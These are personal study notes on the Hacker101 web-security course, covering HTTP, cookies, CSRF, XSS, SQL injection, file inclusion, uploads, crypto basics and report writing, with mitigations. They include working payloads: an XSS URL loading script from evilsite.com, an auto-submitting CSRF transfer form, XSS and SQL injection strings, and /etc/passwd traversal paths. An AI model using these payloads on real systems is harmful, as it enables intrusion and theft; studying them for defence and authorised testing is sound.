# Hacker101 (by HackerOne)

## [Introduction](https://www.youtube.com/watch?list=PLxhvVyxYRviZsAKXZEbmfsVMZp3s0KaVE&v=zPYfT9azdK8&feature=emb_logo)

### Setup

Required material is:

- able to run Java apps
- performing web requests (I'll use the REST Client for Visual Studio Code, an extension that is kinda like Postman)
- Burp Proxy (free edition is fine) I grabbed the [community edition](https://portswigger.net/burp/releases/professional-community-2020-5-1). This will allow to monitor HTTP(S) communication
- Firefox to allow to set proxy settings specifically in the browser instead of system-wide

Setting up Burp Proxy was not as easy as I would have thought. That's what I get for not reading the documentation :)
There are a couple page that helps setting everything up:

- launch Burpsuite and ensure the proxy's intercept is on
- https://portswigger.net/support/installing-burp-suites-ca-certificate-in-firefox to set up swigger CA
- https://portswigger.net/support/configuring-firefox-to-work-with-burp to set the proxy configuration of firefox
- Then each time you try to send a request through firefox, you see the request on burp suite (and you need to allow it if you want to access the page)

### Notes on reporting a vulnerability

At least includes:

- title
- severity
- description
- reproduction steps -- ideally with a PoC
- impact -- What can be done with this vulnerability?
- mitigation -- How to fix this?
- affected assests -- a list of affected URLs

## [The web in depth](https://www.youtube.com/watch?v=DWBUQiaN5ZM&list=PLxhvVyxYRviZsAKXZEbmfsVMZp3s0KaVE&index=2)

### Anatomy of an HTTP request

Example of a request:

```
GET /sessions/introduction HTTP/1.1
Host: www.hacker101.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en,fr;q=0.8,fr-FR;q=0.5,en-US;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
If-Modified-Since: Mon, 15 Jun 2020 04:25:49 GMT
If-None-Match: W/"5ee6f84d-157e"
```

The format is basically as follow:

```
VERB /resource/path HTTP/1.1
Header1:Value1
Header2:Value2`

<Body>
```

A couple of familiar header:

- `Host`: the desired host handling the request
- `Accept`: what MIME type(s) are accepted by the client, often JSON or XML for web services
- `Cookie`: Passes cookie data to the server
- `Referer`: Page leading to this request (not passed to other servers when using HTTPS on the origin)
- `Authorization`: Used mainly for 'basic auth'.

### Cookies 🍪

Cookies are key-value with a TTL(time-to-live). They are sent by the server and are stored client-side for the duration of the TTL. Each cookie has a domain patten that it applies to, and they are sent with each request from the client to the server if the domain pattern matches the host.

### Scope

- Cookies added for `example.com` can be read by any subdomain of `example.com`
- Cookies added for a subdomain can only be read in that subdomain and its subdomains
- A subdomain can set cookies for its own subdomains and parent, but can't set cookies for sibling domains
  - ✅ `test.example.com` **can** set cookies for `example.com`
  - ✅ `test.example.com` **can** set cookies for `hello.test.example.com`
  - ❌ `test.example.com` **cannot** set cookies for `app.example.com`

#### Flags 🏁

The server adds these flags in the `Set-Cookie` header in the request that transmit the cookie

- Secure: the cookie is only accessible to HTTPS pages
- HTTPOnly: the cookie cannot be read by Javascript

### HTML

#### Parsing

HTML should be parsed according to the relevant spec (now HTML5).

If your HTML is parsed differently in the web-application firewall, in the browser etc, it can lead to security vulnerabilities.

An example:

http://example.com/vulnerable?name=<script/xss%20src=https://evilsite.com/my.js>

used to give

```html
<!DOCTYPE html>
<html>
  <head>
    <title>
      Vulnerable page named <script/xss src=http://evilsite.com/my.js>
    </title>
  </head>
</html>
```

because Firefox parses the slash as a whitespace, enabling the attack.

#### Legacy Parsing

- autoclose of `<script>` tags
- autoclose of a missing angle bracket

#### Content Sniffing

##### MIME sniffing

Browser used to not only look at the `Content-Type` header that the server is passing, but also the content of the page. It leads to situation were image and text files containing HTML tags would execute as HTML.

One way modern application works against MIME sniffing is by using multiple domains (one for the app, one for uploading text/images etc)

##### Encoding sniffing

If you don't specify an encoding for an HTML document, the (mainly older) browser will try to determine it with heuristics.

If you control the way the browser decodes text, you can alter parsing.

A good example: putting UTF-7 text ihto XSS payloads
Consider the payload:
`+ADw-script+AD4-alert(1);-ADw-/script+AD4-`
This will go cleanly through HTML encoding, as there are no 'unsafe' characters.
If the browsers sniffs the encoding and switch to UTF-7, it enables the attack.

This can be an effective strategy to go over a firewall.

##### Ending note on sniffing

**ALWAYS** specify the `Mime-Type` header and the encoding for pages, so that the server and client don't have a discrepancy.

### Same-Origin Policy

Backbone of the modern web security. It is through SOP that the browser restricts security-critical features:

- domains you can contact with XMLHttpRequest
- access to the DOM across separate frames/windows

#### Scope

It works with origin matching, which is way stricter than cookies:

- Protocol must match -- no crossing HTTP/HTTPS boudaries
- Port numbers must match
- Domain names must be an exact match -- no wildcarding or subdomain walking

#### SOP Loosening ⚠️

Three ways to make Same-Origin Policy less restrictive (⚠️to use with care⚠️)

- changing document.domain [MDN on document.domain](https://developer.mozilla.org/en-US/docs/Web/API/Document/domain)
- posting messages between windows
- CORS (cross-origin resource sharing)

#### CORS

Allows to make XMLHttpRequests to domain outside of your origin, but with special headers to signify where the request originates.

Relatively new features, security prospects largely unexplored.

(Play with CORS to get familiar with it)

### Cross-Site Request Forgery CSRF

CSRF is when an attacker tricks a victim into going to a page controlled by the attacker, which then submits data to the target site as the victim.

One of the most common vulnerabilities, and enables a lot of other vulnerabilities (namely XSS)

#### Example

The canonical example is a bank transfer site.
You have a form that allows a user to transfer money from their account to a destination account

```html
<form action='/levels/0/' method='POST'>
    <h2>Transfer Funds</h2>
    Destination account: <input type='input' name='to' value=''></br>
    Amount: <input type='input' name='amount' value=''>
    </br>
    </br>
    <input type='submit' value='Transfer'>
</form>
```

With this code below, you can have an automatic exploit if the user is logged in:

```html
<body onload='document.forms[0].submit()'>
    <form action='https://victim.vulnerable/levels/0/> method='POST'>
        <input type='hidden' name='amount' value='1000000'>
        <input type='hidden'name='to' value='1625'>
    </form>
</body>
```

You can see that the submit is automatically called by the `onload` in the previous snippet to automate the attack.
This would transfer 1000000\$ to the user with ID 1625.

#### Mitigation

To mitigate, we need a way for the server to know for sure that the request has originated on its own page.

The best to do that is to generate CSRF tokens. Those are random tokens, tied to the user session. You then use the token in each form.

```html
<form action="post" method="post">
  What's on your mind?<br />
  <textarea cols="40" rows="3" name="status"></textarea><br />
  <input type="hidden" name="csrf" value="8543addacc844....." />
  <input type="submit" />
</form>
```

When the server gets a POST request, it should check to see that the CSRF token is present and matches the token associated with the user's session.

📝 This will not help you with GET requests, but application should not be changing state with GET requests anyway

#### How not to mitigate

Do not include or generate your CSRF token on the client-side (with JS). If you do, anybody can just grab it and use it in their exploit.

### Wrap Up

- Cookie domain scoping is a source of problem
- Same-Origin Policy is strict, but complex enough that lots of mistakes are made
- Cross-Site Request Forgery is when an attacker tricks a victim into going to a page that triggers requests on other sites
  - ✅ Use CSRF tokens!

## [XSS and Authorization](https://www.youtube.com/watch?v=HGaFCcWM57U&list=PLxhvVyxYRviZsAKXZEbmfsVMZp3s0KaVE&index=3)

### XSS Review

Different types of XSS:

- reflected XSS -- Input from a user is directly returned to the browser, permitting injection of arbitrary content
- stored XSS -- Input from a user is stored on the server (often in DB), and returned later without proper sanitization (escaping etc)
- DOM XSS -- Input from a user is inserted into the page's DOM without proper handling, enabling the insertion of arbitrary nodes

First step is to find an XSS vulnerability. For each input, try to:

- figure out where it goes: Does it get embedded in a tag? into a string in a script tag?
- figure out any special handling: like do URL get turned into links? Any special handling has a big opportunity to have flaws
- figure out how special characters are handled. A good starting point is to see how '< >;:' are handled.

From those 3, you should be able to tell if a particular input is vulnerable to XSS.

📝 If the chars '<' and '>' are not blocked in the inputb, but you can't pass `<script>alert('foo')</script>` because a WAF (Web Application Firewall) blocks it, try instead with a image tag with an erroneous link and an `onerror` attribute like `<img src="image_that_cant_be_found.jpg" onerror=" alert('toto')"/>`

📝 If you can embed DOM event like `onmouseover` into your payload (when `"` are not escaped for example), that might be a good way also to run some JS

📝 If you see your input reflected in a script tag, there are many many ways to break it!

#### Mitigation

Escaping/encoding is not always sufficient, context matters.
The best mitigation is to not use user-controlled input to fill a script tag or a an attribute. It is extremely hard to properly mitigate this.

#### Example of DOM XSS

Let's look at a simple page that includes a flag in the page based on the locale specified in the has, e.g. http://example.com/#en-us

```html
<div class="flag">
  <script>
    var locale = "en-us";
    if (location.hash.length > 2) locale = location.hash.substring(1);
    document.write('<img src="flags/' + locale + 'png"');
  </script>
</div>
```

If you write in the url: `http://example.com/#"><script>alert(1);</script>` you can execute code as well.
It is very very similar to a rXSS, but because it's all client-side, you don't need to worry about the defense mechanisms of the server (WAF for example)

It's also very difficult to mitigate this, so do your best to not put user-controlled data on the pages!

### Forced browsing and improper authorization

It is when you have a failure to properly authorize access to a resource: admin area, access to others users data etc

#### Example

In a CMS with incrementing ID, if changing the ID let you access the page of an another user, you have improper authorization

Like `http://supercms.com/levels/1/post?id=456`, if you change 456 to 455, and that gives you a post from another user.

#### Privileges

One of the best techniques when testing an application is to perform every action you can as the highest-privileged usre, then switch to a lower-privileged user and replay those requests, changing session IDs/CSRF token as needed.

### WRAP UP

- XSS
  - Reflected
  - Stored
  - DOM-based
    rXSS and sXSS are very similar in terms of exploitation and mitigation.
    DOM-based XSS can't be mitigated by any core strategy and exploitation differs greatly between cases.
- Forced browsing and improper authorization are basically the same thing, it differs slightly in how the bugs are found

⚠️ If you can, don't put user-controlled data into tags, attribute or url ⚠️

### XSS Cheat Sheet

A couple of quick things to try when testing for XSS:

- `"><h1>test</h1>`
- `'+alert(1)+'`
- `"onmouseover="alert(1)`
- `http://"onmouseover="alert(1)`

## [SQL Injections](https://www.youtube.com/watch?v=bIB3Hi6KeZU&list=PLxhvVyxYRviZd1oEA9nmnilY3PhVrt4nj&index=5&t=0s)

### Directory Traversal

Manipulation the construction of a path to walk the filesystem tree and control where files are being read/written.

On most OSes there are two special directories: `.` and `..`. This allow to reach most of the filesystem is used in the right manner.

#### Example

```PHP
<?php>
echo file_get_contents('/var/www/sandbox/uploads/' . $_GET['file']);
?>
```

In this simple example, we append the GET parameter `file` to the path `/var/www/sandbox/uploads/`, then read that file and echo it to the page.
If the parameter `file` is of the form `../../../../etc/passwd`, you could see on the on the page the passwords for the machine the code is on!

#### Mitigation

Very common vulnerability despite the fact that it is one of the easiest to fix.

- Don't allow path separators `/` and `\` if the user should not be able to access files outside the path you're specifying.
- Strip instances of `../` or `..\` from paths

An indirect way, wich is better in every way:

- don't allow user to control paths whatsoever. (especially relevant to file upload paths)

### Command Injection

If a website/api let you run command that like like UNIX/DOS command, maybe they are just doing an `exec` behind the curtain. In this case, you can use `;` and backticks (`) to try to execute multiples commands (or subcommands).

#### Mitigation

Never embed user data into a command line.

If you really must, you can use shell escaping (`escapeshellcmd()` for PHP)

### SQL injection

When you use user input in your SQL query

- SELECT
- UPDATE
- INSERT INTO

#### Mitigation

- Ensure all strings are properly quoted and escaped
- Parameterized queries
- Use an ORM for data access (not always 100% secure though depending on how the ORM handle things)

#### Tips

- `'OR 1='1` will returns all rows
- `'AND 0=1` will returns no rows

By trying those two, you might detect page that load too much or no data and that would indicate that an SQL injection is doable.

To exfiltrate data, the simplest is usually with `UNION`.

Like if you have a query like: `SELECT foo, bar, baz FROM some_table WHERE foo='user input'`.
you can transform it into `SELECT foo, bar, baz FROM some_table WHERE foo='1' UNION SELECT 1,2,3; --';` by passing the right user data. That will return an extra row `(1, 2, 3)`. Once you can do that, you can extract data from other tables for instance (as long as you match the column counts of the initial query)

#### Blind SQL Injection

Kinda the same as before, but it's when you can't see the results of the query. An example would be a login page, where the only feedback you get is if your login has succeeded or not.

Two types:

- oracles -- you get back a binary condition (success or failure)
- truly blind -- you see no difference whether the query failed or not

##### Exploiting Oracles

Oracles allow you to answer a question with a true of false. Meaning that you can exfiltrate data one bit at a time..

For instance, you could read the administrator password for a site, bit by bit, to reconstruct it.
You might want to write a script to do that, not manually.

##### Blind to Oracle

You can't see the query result but you might be able to see one side-effect of it: how long it take to execute.
If you can insert a delay in the query, say 10second if the query returns false, 1second if the query returns true, you basically turned the blind query into an Oracle. But instead of getting back a straight answer, we have to time the request.

#### Detecing Database

SQL syntax or functionnality differs wildly across different databasess engines. MSSQL has `WAITFOR DELAY` to introduce a delay, but with MySQL you would do it with the `BENCHMARK()` function to slow down the query. So being to identify wich DB the application use is critical to easy exploitation.

## [Clickjacking](https://www.youtube.com/watch?v=jcp5t8PsMsY&list=PLxhvVyxYRviZd1oEA9nmnilY3PhVrt4nj&index=5)

### Example: likejacking

This generally takes the form of an ad-covered page with what looks like avideo player in the middle.
When the user clicks the play button on the player, nothing happens. That's because they really juste clicked a Facebook 'Like' button, posting the video site tot their wall and spreading this to their friends, all without their knowledge.

This can have many application, not only likejacking.

One techniques involved duplicating your mouse cursor, a fixed distance away from the original, then hiding the original.
The victim then would click on safe elements with the new cursor, when in reality they're clicking on unsafe elements with the original cursor.

### Mitigation

- Framekiller JS sent to clients will break out of the IFrame, mitigating clickjacking (but IE is in trouble)
- Content Security Policy headers can mitigate this
- X-Frame-Options header can restrict which origins can embed a given page (it's the most effective!). You can set the header to DENY or SAMEORIGIN to prevent any attacker-controlled site from embedding your page and executing a clickjacking attack.

## [Session Fixation](https://www.youtube.com/watch?v=tkSmaMlSQ9E&list=PLxhvVyxYRviZd1oEA9nmnilY3PhVrt4nj&index=6)

It'a a bug where the session becomes fixated.

If the session ID in an insecure location (the query string for example), an attacker can trick a victim into using a given session ID to log in.

### Two underlyings problems

- Session IDs in the query string are easy to leak to other users (or other sites via Referer)
- Session IDs are used as the sole mechanism to bind a browser to a user

### Visible session IDs

Mostly a problem of the past, only remains in legacy PHP apps. They not only enable session fixation, but complete leakage of session credentials!

#### Session == Authentication

Session are most commonly used for consistent authentication throughout the user's continued use of an application, right?

But they are often used to store things like:

- number of login attemps
- saved email/username
- many other pieces of data

### Mitigation

Getting rid of visible Session ID, but if your app/server still allows them, it's still insecure.

When a user logs in, they get a brand new session with a brand new ID. No matter if they just got a session for visiting the site 30seconds ago. This cuts session fixation by not allowing a single session ID to persist across logins, and reinforces the proper session == authentication paradigm

## [File Inclusion Bugs](https://www.youtube.com/watch?v=tkSmaMlSQ9E&list=PLxhvVyxYRviZd1oEA9nmnilY3PhVrt4nj&index=7)

### Example

You're testing a website and you see the following URL:

`http://example.com/index.php?page=home`

If you change the query to `?page=test`, it gives you the following error:

`Warning: include(test.php): failed to open stream: No such file or directory in - on line 26`

It seems to include() page you reference in the query, and appending '.php' to it.

What if we change it to `?page=http://demoseen.com/test`?
Suddenly, it's making a web request -- any code that's contained in that file is going to be executed by the website.
In many cases, PHP (and other languages/frameworks) will be configured to not allow web requests from an include(). When they're possible, you have RFI -- when they're not, LFI.

### Authorization Bypass

Often applications are written such that authorization checks happen in a different file than the actual logic.
So in our scenario, going to `?page=admin` might give you a login prompt, but `?page=admin_users` might give you direct access to the user management component.

### Mitigation

No user input should be used in include().

Otherwise: whitelisting as strictly as possible without restricting fonctionality.

If neither is viable, then removing directory separators may be the only route. This is _not_ recommended, but will prevent URLs and directory traversal.

## [File Upload Bugs](https://www.youtube.com/watch?v=tkSmaMlSQ9E&list=PLxhvVyxYRviZd1oEA9nmnilY3PhVrt4nj&index=8)

### Example of a upload request

It's mostly a standard POST. The main difference lies in the header `Content-Type` `multipart/form-data`, and the `boundary` separators.

### Filenames

The most obvious way to break this is via the filename. If you see an uploaded file retain the original filename -- or a derivative -- chances are good that you can manipulate it. (_directory traversal_ for instance)

### MIME Types

Often the MIME Type is stored in a database, along with the uploaded filename and various metadata.

If this is sent down with the file when it's accessed, this can allow exploits like XSS. For example, you could upload an HTML file disguised with an image filename, and send text/html as the MIME type.
Upon access, the browser will parse it like normal.

### Mitigation

#### Separated domain

In the vast majority of cases, files uploaded by users should be hosted on a separate domain. jthe reason fo this is that if you don't do that, same-origin policy comes into play, and it's possible for Javascript running in the context of the domain to manipulate the site, get cookies, etc.

This does not solve any of the issues directly, but it does give you insurance if your other mitigations fail.

#### Generated Filename

Filenames should never come from a user directly. When you receive a file upload, a filename should be generated randomly (or via a hash of file contents + timestamp), with an extension based on MIME type or detected file type.

Note that the extensions shoud be whitelisted. You don't want people uploading HTML or other malicious content.

#### Type and Disposition

If the uploaded files are not being served directly from the filesystem, then the issue becomes: what MIME type and content disposition do we use?

The general rule is that MIME types should be whitelisted. If you want to allow types that are not on the list, the content disposition should be set to 'attachment'. That will force the browser to download the file, rather than display it.

📝[MDN page](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition) on the `Content-Disposition` header

#### Image Stripping

If you're handling only images, then removing EXIF data from JPEGs, ancillary chunks from PNG files, and all other extraneous data is always a good idea.

The reason is that you can embed HTML in those places, and even if today the browser wont load your images as HTML, that could change in the futur, so better be safe than sorry.

## [Null Termination Bugs](https://www.youtube.com/watch?v=tkSmaMlSQ9E&list=PLxhvVyxYRviZd1oEA9nmnilY3PhVrt4nj&index=9)

The null character (\x00, %00, etc) is used to terminate C strings. In fact, C strings are an array of char that are supposed to be ended with the null character. This can cause issue discussed here.

While web application written in C are not common, Python, PHP, Ruby and others dynamic languages are written in C. This legacy comes in handy. (this video will pick mostly on PHP but it's not the only one that is vulnerable)

### Example

```php
<?php
include($_GET['page'] . '.php');
?>
```

If we throw a null byte at the end of the page variable, it might only read up to that point when opening the file, allowing us to read any file we want.

So we try `?page=/etc/passwd%00`, and we get a passwd file in the page.

This is due to PHP using native C fuctions (as most runtimes do), and due to lack of proper string handling, this bug pops up all over the place.

### Testing

Strongly recommended to throw null bytes into anything related to file handling, particularly in the case of a PHP web application.

Most browsers will strip %00 from requests or truncate them. Burp will allow you to embed literal nulls as well as URL encoded (%00) nulls.

You'll find very interesting bugs if you do this regularly.

## [Unchecked Redirects](https://www.youtube.com/watch?v=AEushmkXRpE&list=PLxhvVyxYRviZd1oEA9nmnilY3PhVrt4nj&index=10)

An unchecked redirect is when a web application performs a redirect to an arbitrary URL outside the application.

### Detecting

Any time you see a redirect, look for the origin of the destination. Often, these will come from a user session in a way that is unexploitable. If, however, you find that it's comgin from the browser in an unsafe way -- for instance, as part of a CSRFable POST request -- you probably have an exploitable case.

### Mitigation

One way is to not allow protocol specification in the destination. That is, remove instances of `http://` and the like. This will mean that -- at worst -- a redirect can only cause a 404.

A better way, is to construct the redirect destination entirely on the server from data the client sends.

## [Secure Password Storage](https://www.youtube.com/watch?v=xZ5cxxllgP8&list=PLxhvVyxYRviZd1oEA9nmnilY3PhVrt4nj&index=11)

Use BCrypt. That's it. Out of the box it offers every property you want, so you get very little chance to make a mistake.

### Goals

- Impervious to rainbow tables
- Computationally expensive to avoir brute-forcing
- Unique per-user, so that cracking one hash can't give you the password of mutiple users

### Candidates

Good candidate if BCrypt is not possible:

- SCrypt is less battle-tested that BCrypt but is supposed to use lots of RAM to make it hard to parallelize.
- PBKDF1 and 2 using per-user salt values with at least 10000 rounds
- SHA256 using per-user salt values with at least 10000 rounds

As a last resort:

- MD5: good in general but too fast so too weak to brute-force

### Salting

Salting is the process of adding a random value to the beginning and/or end of a password, to make rainbow tables useless.

When you do this, though, it's important not not have single global salt values for every hash.

## [Crypto Crash Course](https://www.youtube.com/watch?v=NTpzmPML42E&list=PLxhvVyxYRviZd1oEA9nmnilY3PhVrt4nj&index=12)

### XOR

Bitwise operator that performs this operation: given two bits (denoted A and B), it outputs a 1 if either A or B are 1, but not both.

```
0 ^ 0 == 0
0 ^ 1 == 1
1 ^ 0 == 1
1 ^ 1 == 0
```

A property of XOR that is critically important for crypto: it can reverse itself.

```
Given D = A ^ B:
A == D ^ B
B == D ^ A
```

From this, we can produce a simple, perfect cryptography scheme:

Generate a key of N bits of true random data. XOR each of the bits of the key with N bits of plaintext. You get a perfectly encrypted ciphertext blob of N bits. Decryption is just XORing ainst the same keystream.

### One-Time pad

This scheme is called a _one-time pad_. If you use a given key only once -- never repeating it, or using the same key for multiple messages -- it's absolutely perfect.
That's the 'one-time' part of it. But obviously, we don't want to have to give out massive pre-generated keys that can only be used once! And that's why we don't use OTP for day-to-day operations.

### Trillion Dollar Question

Due to the fact that we don't really want to pass around massive keys to everyone we want to communicate securely with, the question becomes: how can we, with the highest assurance of safety and the least amount of time, hsare keys with all the relevant parties?

The entire field of cryptography exists to answer that question. Then we poke holes in the answers.

### Types of Ciphers

We can break down the types of ciphers in use today into two families with their underlying subtypes, all with their own puprpose and flaws.

- Symmetric -- Both sides share the same key
  - Stream -- Encrypts data byte-by-byte
  - Block -- Encrypts data block-by-block
- Asymmetric -- Each side has their own private key and exchange public keys

### Stream Ciphers

Encrypt byte-by-byte. The most common one you'll see is RC4, which is often used in SSL.

The basic construction is essentially a random number generator seeded with your key, which generates bytes that XORed with each byte of plaintext for encryption. Decryption is simply XORing the ciphertext instead. This means that both operations are identical.

### Block Ciphers

More familiar to most people. AES(Rijndael), DES, 3DES, Twofish, and other common ciphers are all block ciphers.

In a block cipher, you split your data into N-byte blocks, and encrypt those separately. Because we can't assume that all data is a multiple of N-bytes long, we have to pad data, introducing complexity. In addition, the encryption and decryption processes are not the same.

#### ECB Mode

Electronic CodeBook mode is the simplest mode of operation for a block cipher. Each plaintext block is encrypted independently to produce a ciphertext block.

This means that if you see two blocks with the same ciphertext, you know that they must have had the same plaintext. (_This is a problem in a lot of cases if I undertand correctly_)

#### CBC Mode

Cipher-Block Chaining is perhaps the most common form you will see. With CBC, each plaintext block is XORed with the ciphertext of the previous block before encryption; the opposite is performed for decryption.

The first block is XORed with the Initialization Vector (IV)

### Asymetric Cyphers

Each party of the communication has a public and a private key. RSA is emplary of this class of ciphers.

Asymmetric ciphers are used for both encryption and signing ( a process that allows one party to validate the source of a message)

Generally, asymetric ciphers are not used for encrypting data directly (due to performance concerns and complexity). Rather, you use them to securely transmit a symmetric key.

Alice wants to send a secure message to Bob. She can encrypt the message with a symmetric key, encrypt the key with Bob's public key, and then send the ciphertext and encrypted key to Bob. He then decrypts the key with his private key and uses that to decrypt the message.

### Hashes

Hashes are constructs that take in an arbitrary blob of data and generate a fixed-size output,generally 128-512bits. MD5, SHA1, SHA2 and others are all hash functions.

Due to the fact that they take data of any size and produce a fixed-size output, all hash algorithms produce collisions -- multiple inputs that produce the same output. The strength of a hash algorithm is in how hard it is to find such collisions.

In its own, a hash is only useful of determining the integrity of data. If you are given a blob of data and it's hash, it's trivially easy to determine if the data has been tampered with in transit.
It does not, however, ensure that the hash itself is what was intended, nor does it authenticate a sender in any way.

### MACs

Message Authentication Codes are generally based on hases, but allow for -- as the name implies -- message authentication.

What this means is that given a MAC, you can ensure that the data has not been tampered with, as well as validating that the MAC itself has not been manipulated.

This is because with a MAC, you have a shared key that is used for construction and validation of the MAC. Without it, you cannot create a valid MAC.

One example of MAC is HMAC

## [Crypto Attacks](https://www.youtube.com/watch?v=jtcpREJLN1Y&list=PLxhvVyxYRviZd1oEA9nmnilY3PhVrt4nj&index=13)

TO WATCH

## [Crypto Wrap-up](https://www.youtube.com/watch?v=Zj6Z4QMzObE&list=PLxhvVyxYRviZd1oEA9nmnilY3PhVrt4nj&index=14)

TO WATCH

## [Threat Modeling](https://www.youtube.com/watch?v=6DI7RIXUTg8&list=PLxhvVyxYRviZd1oEA9nmnilY3PhVrt4nj&index=15)

Threat modeling is a process by which you can determine what threats are important to an application and find points where defenses may be lacking. There are many different types of threat modeling, but we'll be going over two today.

### Why?

- Achieve better coverage in testing
  - Make sure you're testing all the entrypoints
- Find more interesting and valuable bugs
  - Have a testing game plan before you start
- Waste less time on dead ends
  - Eliminate entire classes of vulnerabilities before you even start testing

### Decomposition

This is the first step of the typical threat modeling process. The modeler will document each component of the application and its infrastructure, then develp data flow diagrams that show how these components interact. Additionally, privilege boundaries are identified, to ensure that proper controls are in place for any data crossing these boundaries.

### Threat Determination

Next you develop threats for each portion of the application, e.g. 'Attacker may be able to access administration features.' You link each of these threats to the components that would be affected in the case of such an attack.

Finally, you rank them by means of an objective measure of severity.

### Countermeasures

You then determine and document any countermeasures currently in place to prevent an attack, along with identifying new locations where countermeasures may be installed to prevent threats you have assessed.

### Useless (for attackers)

This is a valuable tool for developers and internal security teams. But this kind of heavy-weight threat modeling approach is completely unsuitable for bug bounty hunters and most software security consultants. It requires too much time, too much access to code and internal documentation, and does not give you a real plan for testing.

### Lighweight threat modeling

#### Enumerate Entrypoints

First you make a list of every entrypoint you can find. One simple approach is to enable Burp Proxy and then use every function of the application which you can find, for every access level you have.

#### Document Target Assets

Think through and write down every asset in which an attacker may be interested, along with the business impact of its compromise:

- User PII and passwords
- Admin panel access
- Transaction histories
- Source code
- Database credentials

#### Game plan

Once you have all that, you can rank the entrypoints in order of perceived value. For instance, any entrypoint which takes little to no user data will likely be less valuable that one which takes a substantial amount of data. Additionally, you have enough information to eliminate entire vulnerability classes from your tests (example: if it's a support knowledge base application, CSRF on any page for end-users will likely give you nothing)

#### Example of threat modeling

You can go to this page https://www.hacker101.com/resources/hackerone_threat_model to get the unauthenticated part of the Hacker One website.

#### Restrict yourself

Keep it under an hour

## [Writing good reports](https://www.youtube.com/watch?v=z60CFFFyZWE&list=PLxhvVyxYRviZd1oEA9nmnilY3PhVrt4nj&index=16)

### Why?

Because if the client (or the company you work for) does not understand the technical job you have done, it's as if you did nothing.

They need to be able to understand and reproduce what you've done.

Your goal with a report should be to give the most useful information possible to the product team. This means they can triage and confirm your bug faster; this gets the money into your pocket even sooner.

It also leads to fewer questions from the team, making everyone's lives easier.

### Anatomy of a good report

- Clear description of the bug
- Real-worl impact
- Concice reproduction steps
- Working examples
  - Proof of concepts links/payload
  - Screenshots
  - Source code snippets

### Example of bad description

'When submitting feedback, the titile tag value isn't escaped, allowing XSS attacks.'

Problems:

- Where does the title come from?
- What privileges are required to execute this attack?
- Which page(s) are actually affected?

### Example of good description

'Withing the administration panel of the site, administrators are able to set the default value for the `<title>` tag, to which page names are prepended. On the 'Submit Feedback' page (https://example.com/portal/feedback), this value is not escaped properly. This means that an attacker with administrative privileges can inject arbitrary HTML into a page, thus effecting a cross-site scripting attack.

### Example of bad impact

'Attacker can add any HTNL to a page, which is cross-site scripting'

Problems:

- What can an attacker accomplish with this?
- Does 'a page' mean a specific page? Is so, which?
- What does the attack flow look like in practice?

### Example of good impact

'An attacked is able to execute JavaScript in the context of the 'Submit Feedback' page. This code is able to perform any action that the victim could ordinarily perform (making posts and sendind messages). As this page is accessible to all users and is clicked commonly, this may allow an attacker to compromise a large number of users without any new interaction being forced'

## [Getting started with Burp](https://www.youtube.com/watch?v=LSqC9qgEMi0&list=PLxhvVyxYRviZd1oEA9nmnilY3PhVrt4nj&index=17)
